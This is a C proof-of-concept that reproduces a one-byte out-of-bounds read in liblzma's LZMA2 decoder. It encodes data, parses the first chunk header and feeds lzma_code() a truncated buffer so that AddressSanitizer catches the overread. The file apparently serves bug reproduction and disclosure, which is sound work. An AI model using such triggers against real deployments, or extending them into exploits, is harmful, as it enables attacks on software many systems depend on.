// Public-API PoC for an out-of-bounds read in the LZMA2 decoder
// (src/liblzma/lzma/lzma2_decoder.c).
//
// Strategy: encode a plaintext with the raw LZMA2 filter, locate the
// first chunk's declared compressed size in the resulting byte stream,
// then feed the decoder exactly one byte short of that chunk's declared
// compressed size through the public streaming API (lzma_code()). A
// correct decoder only returns LZMA_OK, asking for more input. The
// buggy decoder computes an input limit that is one byte past the end
// of the caller-supplied buffer and dereferences it.
//
// Build:
//   cc -fsanitize=address -g -I<src>/liblzma/api newbug.c <liblzma.a> -o newbug
// Run:
//   ./newbug

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "lzma.h"

static void
die(const char *msg, lzma_ret ret)
{
	fprintf(stderr, "%s: %d\n", msg, (int)ret);
	exit(1);
}

int
main(void)
{
	// Plaintext big enough to make the encoder emit more than one
	// LZMA2 chunk's worth of compressed bytes isn't required; we only
	// need a single, normal, in-contract LZMA2 chunk.
	size_t text_size = 4096;
	uint8_t *text = malloc(text_size);
	for (size_t i = 0; i < text_size; ++i)
		text[i] = (uint8_t)(i * 2654435761u >> 24);

	lzma_options_lzma opt;
	if (lzma_lzma_preset(&opt, 9))
		die("lzma_lzma_preset", LZMA_PROG_ERROR);

	lzma_filter filters[2] = {
		{ .id = LZMA_FILTER_LZMA2, .options = &opt },
		{ .id = LZMA_VLI_UNKNOWN, .options = NULL },
	};

	size_t enc_cap = text_size * 2 + 1024;
	uint8_t *enc = malloc(enc_cap);
	size_t enc_size = 0;

	lzma_ret ret = lzma_raw_buffer_encode(filters, NULL,
			text, text_size, enc, &enc_size, enc_cap);
	if (ret != LZMA_OK)
		die("lzma_raw_buffer_encode", ret);

	// Parse the first LZMA2 chunk header to find where the compressed
	// payload starts and how long it is. This mirrors the public
	// LZMA2 chunk format (see lzma2_decoder.c SEQ_CONTROL and friends).
	size_t pos = 0;
	uint32_t control = enc[pos++];
	if (control < 0x80) {
		fprintf(stderr, "first chunk isn't an LZMA chunk\n");
		return 1;
	}

	// Uncompressed size field (3 bytes total, including control).
	pos += 2;

	uint32_t compressed_size = (uint32_t)enc[pos] << 8;
	pos += 1;
	compressed_size += enc[pos] + 1U;
	pos += 1;

	if (control >= 0xC0) {
		// New properties byte.
		pos += 1;
	}

	printf("chunk header size = %zu, compressed_size = %u, "
			"total encoded = %zu\n",
			pos, compressed_size, enc_size);

	if (pos + compressed_size > enc_size) {
		fprintf(stderr, "encoded stream smaller than expected; "
				"adjust plaintext\n");
		return 1;
	}

	// Feed the decoder a buffer that ends exactly one byte short of
	// the end of the first chunk's declared compressed data. Allocate
	// it with the exact size so a one-byte overread is detectable.
	size_t short_size = pos + compressed_size - 1;
	uint8_t *short_buf = malloc(short_size);
	memcpy(short_buf, enc, short_size);

	lzma_stream strm = LZMA_STREAM_INIT;
	ret = lzma_raw_decoder(&strm, filters);
	if (ret != LZMA_OK)
		die("lzma_raw_decoder", ret);

	uint8_t *out = malloc(text_size + 4096);

	strm.next_in = short_buf;
	strm.avail_in = short_size;
	strm.next_out = out;
	strm.avail_out = text_size + 4096;

	// This call triggers the decoder's SEQ_LZMA path with an
	// under-sized input buffer. On a correct decoder, it simply
	// returns LZMA_OK (needs more input). On the buggy decoder, it
	// reads one byte past short_buf[short_size - 1].
	ret = lzma_code(&strm, LZMA_RUN);

	printf("lzma_code returned %d (no crash)\n", (int)ret);

	lzma_end(&strm);
	free(text);
	free(enc);
	free(short_buf);
	free(out);

	return 0;
}
